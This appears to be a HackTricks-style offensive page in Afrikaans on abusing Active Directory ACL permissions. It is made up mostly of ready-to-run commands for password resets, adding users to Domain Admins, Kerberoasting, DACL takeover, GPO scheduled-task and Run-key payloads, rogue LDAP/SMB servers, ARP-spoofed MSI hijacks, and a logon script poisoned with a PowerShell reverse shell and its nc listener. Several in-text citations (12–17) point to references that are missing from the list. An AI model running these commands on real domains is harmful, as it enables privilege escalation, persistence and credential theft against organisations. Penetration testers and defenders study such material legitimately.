# Misbruik van Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie bladsy is hoofsaaklik ’n opsomming van die tegnieke uit** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Vir meer besonderhede, raadpleeg die oorspronklike artikels.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll-regte op gebruiker**

Hierdie privilege gee ’n aanvaller volledige beheer oor ’n teikengebruikersrekening. Sodra `GenericAll`-regte met die `Get-ObjectAcl`-command bevestig is, kan ’n aanvaller:

- **Verander die teiken se wagwoord**: Deur `net user <username> <password> /domain` te gebruik, kan die aanvaller die gebruiker se wagwoord reset.
- Vanaf Linux kan jy dieselfde oor SAMR met Samba `net rpc` doen:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **As die rekening gedeaktiveer is, verwyder die UAC-vlag**: `GenericAll` laat toe dat `userAccountControl` gewysig word. Vanaf Linux kan BloodyAD die `ACCOUNTDISABLE`-vlag verwyder:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Wys ’n SPN aan die gebruiker se rekening toe om dit kerberoastable te maak, en gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT)-hashes te onttrek en te probeer kraak.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deaktiveer pre-authentication vir die gebruiker, wat sy rekening kwesbaar maak vir ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Met `GenericAll` op ’n gebruiker kan jy ’n certificate-based credential byvoeg en as daardie gebruiker authenticate sonder om hul password te verander. Sien:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-regte op Groep**

Hierdie privilege laat ’n attacker toe om group memberships te manipulateer indien hulle `GenericAll`-regte op ’n groep soos `Domain Admins` het. Nadat die groep se distinguished name met `Get-NetGroup` geïdentifiseer is, kan die attacker:

- **Hulself by die Domain Admins-groep voeg**: Dit kan via direkte commands gedoen word of deur modules soos Active Directory of PowerSploit te gebruik.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Vanaf Linux kan jy BloodyAD ook gebruik om jouself by willekeurige groepe te voeg wanneer jy GenericAll/Write-lidmaatskap daaroor het. As die teikengroep genestel is binne “Remote Management Users”, sal jy onmiddellik WinRM-toegang verkry tot gashere wat daardie groep toepas:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Die besit van hierdie regte op ’n rekenaarobjek of gebruikersrekening laat die volgende toe:

- **Kerberos Resource-based Constrained Delegation**: Stel die oorneem van ’n rekenaarobjek in staat.
- **Shadow Credentials**: Gebruik hierdie tegniek om ’n rekenaar- of gebruikersrekening na te boots deur die regte om shadow credentials te skep, te misbruik.

## **WriteProperty on Group**

As ’n gebruiker `WriteProperty`-regte op alle objekte vir ’n spesifieke groep het (byvoorbeeld `Domain Admins`), kan hulle:

- **Hulle by die Domain Admins Group Voeg**: Hierdie metode, wat bereik kan word deur die `net user`- en `Add-NetGroupUser`-commands te kombineer, laat privilege escalation binne die domein toe.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Hierdie privilege stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur commands te gebruik wat groeplidmaatskap direk manipuleer. Die volgende command sequence maak self-byvoeging moontlik:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

’n Soortgelyke voorreg stel aanvallers in staat om hulself direk by groepe te voeg deur groepeienskappe te wysig indien hulle die `WriteProperty`-reg op daardie groepe het. Die bevestiging en uitvoering van hierdie voorreg word met die volgende gedoen:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Die besit van die `ExtendedRight` op ’n gebruiker vir `User-Force-Change-Password` laat wagwoordterugstellings toe sonder kennis van die huidige wagwoord. Verifikasie van hierdie reg en die uitbuiting daarvan kan deur PowerShell of alternatiewe command-line tools gedoen word, wat verskeie metodes bied om ’n gebruiker se wagwoord terug te stel, insluitend interaktiewe sessies en one-liners vir nie-interaktiewe omgewings. Die commands wissel van eenvoudige PowerShell-aanroepe tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van aanvalsvectors demonstreer.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner op groep**

As ’n aanvaller vind dat hulle `WriteOwner`-regte oor ’n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral ’n groot impak wanneer die betrokke groep `Domain Admins` is, aangesien die verandering van eienaarskap breër beheer oor groepseienskappe en lidmaatskap moontlik maak. Die proses behels die identifisering van die korrekte objek met `Get-ObjectAcl` en daarna die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig, hetsy volgens SID of naam.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Hierdie permission stel 'n attacker in staat om user properties te wysig. Spesifiek, met `GenericWrite`-toegang kan die attacker die logon script path van 'n user verander om 'n malicious script tydens user logon uit te voer. Dit word bereik deur die `Set-ADObject`-command te gebruik om die `scriptpath`-property van die target user op te dateer sodat dit na die attacker's script wys.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Met hierdie privilege kan aanvallers groeplidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van ’n credential object, die gebruik daarvan om gebruikers by ’n groep te voeg of daaruit te verwyder, en die verifiëring van die lidmaatskapveranderinge met PowerShell-opdragte.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Vanaf Linux kan Samba `net` lede byvoeg/verwyder wanneer jy `GenericWrite` oor die groep het (nuttig wanneer PowerShell/RSAT nie beskikbaar is nie):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Om 'n AD-object te besit en `WriteDACL`-voorregte daarop te hê, stel 'n aanvaller in staat om aan hulself `GenericAll`-voorregte oor die object toe te ken. Dit word deur middel van ADSI-manipulasie bewerkstellig, wat volle beheer oor die object en die vermoë om sy groeplidmaatskappe te wysig, moontlik maak. Ten spyte hiervan bestaan daar beperkings wanneer hierdie voorregte met die Active Directory-module se `Set-Acl` / `Get-Acl` cmdlets probeer uitbuit word.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner vinnige oorname (PowerView)

Wanneer jy `WriteOwner` en `WriteDacl` oor ’n gebruiker- of diensrekening het, kan jy volle beheer oorneem en sy wagwoord met PowerView terugstel sonder om die ou wagwoord te ken:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notas:
- Jy moet dalk eers die eienaar na jouself verander as jy slegs `WriteOwner` het:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Valideer toegang met enige protokol (SMB/LDAP/RDP/WinRM) nadat die wagwoord teruggestel is.

## **Replication on the Domain (DCSync)**

Die DCSync-aanval benut spesifieke replication permissions op die domein om ’n Domain Controller na te boots en data, insluitend gebruikersbewyse, te sinkroniseer. Hierdie kragtige tegniek vereis permissions soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot ’n Domain Controller.<sup>[[5]](#references)</sup> [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Gedelegeerde toegang om Group Policy Objects (GPOs) te bestuur, kan beduidende sekuriteitsrisiko’s inhou. Byvoorbeeld, indien ’n gebruiker soos `offense\spotless` GPO-bestuursregte gedelegeer is, kan hulle privileges soos **WriteProperty**, **WriteDacl** en **WriteOwner** hê. Hierdie permissions kan vir kwaadwillige doeleindes misbruik word, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Om verkeerd gekonfigureerde GPOs te identifiseer, kan PowerSploit se cmdlets aan mekaar gekoppel word. Dit maak die ontdekking moontlik van GPOs wat ’n spesifieke gebruiker permission het om te bestuur: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Dit is moontlik om vas te stel op watter rekenaars ’n spesifieke GPO van toepassing is, wat help om die omvang van potensiële impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Om te sien watter policies op ’n spesifieke rekenaar toegepas word, kan commands soos `Get-DomainGPO` gebruik word.

**OUs with a Given Policy Applied**: Organisatoriese eenhede (OUs) wat deur ’n gegewe policy geraak word, kan met `Get-DomainOU` geïdentifiseer word.

Jy kan ook die tool [**GPOHound**](https://github.com/cogiceo/GPOHound) gebruik om GPOs te enumerate en probleme daarin te vind.

### Abuse GPO - New-GPOImmediateTask

Verkeerd gekonfigureerde GPOs kan uitgebuit word om code uit te voer, byvoorbeeld deur ’n onmiddellike geskeduleerde taak te skep. Dit kan gedoen word om ’n gebruiker by die plaaslike administrators-groep op geraakte masjiene te voeg, wat privileges aansienlik verhoog:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Die GroupPolicy-module, indien geïnstalleer, maak die skepping en koppeling van nuwe GPO's moontlik, asook die instel van voorkeure soos registerwaardes om backdoors op geaffekteerde rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en dat ’n gebruiker by die rekenaar aanmeld vir uitvoering:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Misbruik GPO

SharpGPOAbuse bied 'n metode om bestaande GPO's te misbruik deur take by te voeg of instellings te wysig sonder dat nuwe GPO's geskep hoef te word. Hierdie tool vereis dat bestaande GPO's gewysig word, of dat RSAT-tools gebruik word om nuwes te skep voordat veranderinge toegepas word:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forseer beleidsopdatering

GPO-opdaterings vind gewoonlik ongeveer elke 90 minute plaas. Om hierdie proses te versnel, veral nadat ’n verandering geïmplementeer is, kan die `gpupdate /force`-opdrag op die teikenrekenaar gebruik word om ’n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPO’s toegepas word sonder om vir die volgende outomatiese opdateringsiklus te wag.

### Onder die enjinkap

By inspeksie van die Scheduled Tasks vir ’n gegewe GPO, soos die `Misconfigured Policy`, kan die byvoeging van take soos `evilTask` bevestig word. Hierdie take word deur scripts of command-line tools geskep met die doel om stelselgedrag te wysig of privileges te eskaleer.

Die struktuur van die taak, soos aangedui in die XML-konfigurasielêer wat deur `New-GPOImmediateTask` gegenereer word, beskryf die besonderhede van die scheduled task - insluitend die opdrag wat uitgevoer moet word en die triggers daarvan. Hierdie lêer verteenwoordig hoe scheduled tasks binne GPO’s gedefinieer en bestuur word, en bied ’n metode om arbitrary commands of scripts as deel van beleidsafdwinging uit te voer.

### Gebruikers en Groepe

GPO’s laat ook die manipulasie van gebruikers- en groep-lidmaatskappe op teikensisteme toe. Deur die Users and Groups-beleidlêers direk te wysig, kan aanvallers gebruikers by bevoorregte groepe voeg, soos die plaaslike `administrators`-groep. Dit is moontlik deur die delegering van GPO-bestuurstoestemmings, wat die wysiging van beleidslêers toelaat om nuwe gebruikers in te sluit of groep-lidmaatskappe te verander.

Die XML-konfigurasielêer vir Users and Groups beskryf hoe hierdie veranderinge geïmplementeer word. Deur inskrywings by hierdie lêer te voeg, kan spesifieke gebruikers verhoogde privileges op geaffekteerde stelsels kry. Hierdie metode bied ’n direkte benadering tot privilege escalation deur GPO-manipulasie.

Verder kan bykomende metodes vir die uitvoer van code of die handhawing van persistence, soos die benutting van logon/logoff scripts, die wysiging van registry keys vir autoruns, die installering van software via .msi-lêers, of die wysiging van service-konfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie maniere om toegang te behou en beheer oor teikensisteme te verkry deur die misbruik van GPO’s.

### Herlei GPC/GPT retrieval na geauthentiseerde rogue-dienste

’n GPO bestaan uit ’n LDAP **Group Policy Container (GPC)** met metadata en ’n SMB-gehoste **Group Policy Template (GPT)** met die beleidslêers. Tydens ’n refresh volg die client die container se `gPLink`, lees die verwysde GPC en sy `gPCFileSysPath`, en laai dan die GPT vanaf daardie UNC-pad af. Gevolglik kan write access tot óf die GPC self óf die `gPLink` van ’n OU, Site of Domain in privileged policy processing omskep word.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### `gPCFileSysPath` poisoning met GPOddity

As die beheerde principal die teiken-GPC kan skryf (direk of deur **NTLM relay to LDAP**), vervang `gPCFileSysPath` met ’n UNC-pad wat deur die aanvaller gehost word. [GPOddity](https://github.com/synacktiv/GPOddity) outomatiseer die LDAP-verandering en bedien ’n malicious GPT wat module-gebaseerde beleidslêers of ’n Immediate Task bevat wat die Group Policy client as `NT AUTHORITY\SYSTEM` uitvoer.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

’n Anonieme of credential-agnostic SMB share is nie voldoende op huidige Windows-clients nie: SMB Secure Negotiate vereis bewys dat authentication geslaag het, dus moet die rogue-diens die domain identity valideer, die SMB session key aflei en sy responses korrek sign. In embedded mode, configureer GPOddity met ’n beheerde machine account en sy service key, en kies dan ’n computer- of user-side payload in die `[COMMANDS]`-afdeling.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**Gebruiker-GPO-randgeval:** ná MS16-072 skep Windows steeds twee SMB2-sessies in die **same TCP connection**: die gebruikersessie lees `GPT.INI`, waarna die rekenaarrekening-sessie effektiewe konfigurasie soos `ScheduledTasks.xml` lees. ’n Rogue server moet dus authentication state, session keys en signing keys volgens SMB2 `SessionId`, en nie slegs volgens socket nie, indekseer. Die Scapy fork wat in GPOddity/OUned ingebed is, implementeer dit deur `SMBStreamSocketMultiplexing` en ’n multiplexing-aware `SMBServer`; single-session Impacket/Scapy servers hergebruik andersins die verkeerde signing state en faal met user policies.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning met OUned

Met `WriteGPLink`, `GenericWrite` of ekwivalente beheer oor ’n OU, Site of Domain kan ’n aanvaller ’n skakel byvoeg waarvan die GPC DN deur ’n attacker-controlled LDAP host bedien word. Hierdie primitive is oorspronklik deur Petros Koutroumpis aangebied; [OUned](https://github.com/synacktiv/OUned) outomatiseer die LDAP write en die malicious GPC/GPT chain.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
Die slagoffer staaf eers by die rogue LDAP-diens en ontvang ’n GPC waarvan die `gPCFileSysPath` na die rogue SMB-diens wys; dit staaf daarna by SMB en pas die verskafde GPT toe. OUned benodig dus ’n rekening met ’n LDAP SPN, ’n masjienrekening met ’n HOST SPN vir SMB (dieselfde masjienrekening kan aan albei vereistes voldoen), en DNS-resolusie of omgekeerde aanstuur wat poorte 389 en 445 na die operateur se gasheer stuur.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
OUned se ingebedde Scapy LDAP-bediener valideer Kerberos/SPNEGO met die werklike beheerde dienssleutel en bedien arbitrêre GPC-data uit JSON. Die leë JSON-sleutel modelleer rootDSE, `base64:`-voorvoegsels verteenwoordig binêre waardes, en die bediener ondersteun add/delete/modify/search plus `BASE`-, `LEVEL`- en `SUBTREE`-soektogte; dit kan oor geen beskerming, integriteit of vertroulikheid onderhandel. Dit maak die diens herbruikbaar wanneer ’n ander Windows-komponent ’n aanvaller-beheerde LDAP-verwysing volg, maar op geverifieerde LDAP aandring.<sup>[[15]](#references)</sup>

Moenie aanvaar dat die sinkronisering van ’n rekeningwagwoord na ’n dummy-domein elke Kerberos-sleutel reproduseer nie: RC4 word van die wagwoord afgelei, terwyl AES string-to-key ook ’n salt gebruik wat van die principal se gasheernaam/domein afgelei word. Deur die werklike AES-sleutel van die rekening aan `KerberosSSP` te verskaf, vermy jy die afdwinging van RC4 deur ’n waarneembare verandering aan die masjienrekening se self-skryfbare `msDS-SupportedEncryptionTypes`.<sup>[[15]](#references)</sup>

#### Opsporingspunte

Korrelleer veranderinge aan `gPCFileSysPath` of `gPLink` met GPO-weergaweveranderinge en nuwe Immediate/Scheduled Task XML. Ondersoek skakels na onverwagte naamruimtekontekste, UNC-gashere buite die goedgekeurde DC/SYSVOL-stel, DNS-rekords wat masjienrekeningname herlei, LDAP/CIFS-dienskaartjies vir ongewone masjienrekeninge, en `msDS-SupportedEncryptionTypes`-veranderinge wat RC4 aktiveer.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` oor ’n OU/domein laat jou toe om die teikengrenshouer se `gPLink`-attribuut te wysig en **’n bestaande GPO te forseer om toegepas te word** sonder om die GPO self te wysig. Dit raak interessant wanneer die gekoppelde GPO reeds na afgeleë inhoud oor **UNC paths** (`\\HOST\share\...`) verwys, omdat geverifieerde gebruikers **SYSVOL** kan lees en vanlyn na herbruikbare beleide kan soek.<sup>[[11]](#references)</sup>

Hoëvlak-werkvloei:

1. Gebruik BloodHound om ’n principal met `WriteGPLink` oor ’n OU te identifiseer en rekenaars/gebruikers binne daardie OU op te som.
2. Kloon `SYSVOL` leesalleen en ontleed GPO’s op soek na **Software Installation**, **drive mappings** (`Drives.xml`) en **logon/startup scripts** wat na UNC paths verwys.
3. Verkies beleide wat na ’n **direkte gasheernaam** wys (byvoorbeeld `\\DC02\share\pkg.msi`) eerder as DFS/domeinnaamruimte-paaie, omdat gasheernaamgebaseerde paaie makliker met L2-spoofing herlei kan word.
4. Voeg die gekose GPO GUID by die teiken-OU se `gPLink` sodat die slagoffer daardie reeds bestaande beleid verwerk.
5. ARP-spoof die UNC-gasheer op dieselfde uitsaaidomein en bind sy IP plaaslik (`ip addr add <target_ip>/32 dev <iface>`) sodat die slagoffer se SMB-verkeer jou gasheer bereik.
6. Bedien die verwagte pad/lêernaam vanaf ’n aanvaller-SMB-bediener (byvoorbeeld `smbserver.py`) en wag vir normale beleidverwerking.

Voorbeeld van `SYSVOL`-insameling en GPO-korrelasie:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Koppel die bestaande GPO aan die teiken-OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

If die gekoppelde GPO ’n MSI vanaf ’n UNC-pad ontplooi, sal die kliënt dit tydens **computer startup** aflaai en as **`NT AUTHORITY\SYSTEM`** installeer. Deur die verwysde host te spoof en ’n malicious MSI onder dieselfde **share/path/name** te bedien, kan jy `WriteGPLink` in SYSTEM code execution omskep **sonder om SYSVOL te wysig**.

Belangrike beperkings:

- **Timing matters**: die nuwe link word tydens policy refresh gesien (gewoonlik ongeveer 90 minute), maar **Software Installation** word gewoonlik tydens **reboot** geaktiveer.
- Windows Installer volg die deployment gewoonlik met die package **`ProductCode`**. As die produk reeds geïnstalleer is, kan die deployment oorgeslaan word.
- Om installer rejection te vermy, patch die rogue MSI sodat sy **`ProductCode`** en **`PackageCode`** ooreenstem met dié van die legitimate package wat deur die GPO verwag word.
- Ou `.aas` advertisement files kan in `SYSVOL` agterbly; valideer dus dat die deployment steeds aktief lyk voordat jy daarop staatmaak.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` veroorsaak dat gebruikers tydens aanmelding of herkoppeling by die gekonfigureerde UNC-pad autentiseer. As jy die verwysde host spoof, kan jy **NetNTLMv2** vaslê. As SMB doelbewus laat misluk word, kan Windows weer oor **WebDAV** probeer, wat **NTLM oor HTTP** stuur en baie meer buigsaam is vir relays na **LDAP(S)**, **AD CS** of **SMB**.

#### Logon/startup script UNC hijack

Dieselfde patroon is van toepassing op UNC-gehoste scripts wat in `SYSVOL` gevind word:

- **Logon scripts** word gewoonlik in die konteks van die **user** uitgevoer.
- **Startup scripts** word gewoonlik in die **computer / SYSTEM**-konteks uitgevoer.

As die script-pad na ’n spoofbare hostname wys, herlei die UNC-host en bedien vervangende script-inhoud vanaf die verwagte ligging.

## SYSVOL/NETLOGON Logon Script Poisoning

Skryfbare paaie onder `\\<dc>\SYSVOL\<domain>\scripts\` of `\\<dc>\NETLOGON\` laat peutering met logon scripts toe wat tydens gebruikersaanmelding via GPO uitgevoer word. Dit lewer code execution in die security context van gebruikers wat aanmeld.

### Locate logon scripts
- Inspekteer user attributes vir ’n gekonfigureerde logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Deursoek domain shares om shortcuts of verwysings na scripts bloot te lê:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Ontleed `.lnk`-lêers om teikens op te los wat na SYSVOL/NETLOGON wys (nuttige DFIR-truuk en vir attackers sonder direkte GPO-toegang):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound vertoon die `logonScript` (scriptPath)-attribuut op gebruikersnodes wanneer dit teenwoordig is.

### Valideer skryftoegang (moenie share-lyste vertrou nie)
Geoutomatiseerde nutsgoed kan SYSVOL/NETLOGON as leesalleen vertoon, maar onderliggende NTFS ACLs kan steeds skryftoegang toelaat. Toets altyd:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
As lêergrootte of mtime verander, het jy skryftoegang. Bewaar oorspronklikes voordat jy dit wysig.

### Vergiftig ’n VBScript-logonskrip vir RCE
Voeg ’n opdrag by wat ’n PowerShell reverse shell (genereer vanaf revshells.com) begin, en behou die oorspronklike logika om te voorkom dat die besigheidsfunksie breek:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Luister op jou host en wag vir die volgende interaktiewe aanmelding:
```bash
rlwrap -cAr nc -lnvp 443
```
Notas:
- Uitvoering vind plaas onder die logging user se token (nie SYSTEM nie). Omvang is die GPO-skakel (OU, site, domain) wat daardie script toepas.
- Maak skoon deur die oorspronklike inhoud/timestamps ná gebruik te herstel.


## References

- [1] [Misbruik van Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Bevoorregte rekeninge en token-voorregte](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Die ACL Attack Path-opdatering](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Voorregte-eskalering met ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skandering vir Active Directory-voorregte en bevoorregte rekeninge](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD-attribuut/UAC-bewerkings vanaf Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (groeplidmaatskap)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Kaping van GPO UNC-paaie vir Code Execution en NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
